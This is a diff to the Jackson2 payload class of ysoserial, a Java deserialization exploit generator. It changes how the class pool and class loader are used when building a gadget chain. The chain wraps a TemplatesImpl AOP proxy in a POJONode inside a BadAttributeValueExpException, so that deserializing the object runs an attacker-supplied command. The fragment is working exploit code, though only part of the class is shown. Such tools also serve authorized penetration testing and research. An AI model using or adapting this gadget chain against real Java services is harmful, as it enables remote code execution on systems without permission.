@@ -1,7 +1,6 @@
 package ysoserial.payloads;
 
 import com.fasterxml.jackson.databind.node.POJONode;
-import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
 import org.springframework.aop.framework.AdvisedSupport;
@@ -39,10 +38,11 @@ public class Jackson2 implements ObjectPayload<Object> {
     }
 
     public Object getObject(final String command) throws Exception {
-        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+        CtClass ctClass = Gadgets.getClassPool().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
         CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
         ctClass.removeMethod(writeReplace);
-        ctClass.toClass();
+        ClassLoader payloadClassLoader = Jackson2.class.getClassLoader();
+        ctClass.toClass(payloadClassLoader, Jackson2.class.getProtectionDomain());
         POJONode node = new POJONode(makeTemplatesImplAopProxy(command));
         BadAttributeValueExpException val = new BadAttributeValueExpException(null);
         Reflections.setFieldValue(val, "val", node);
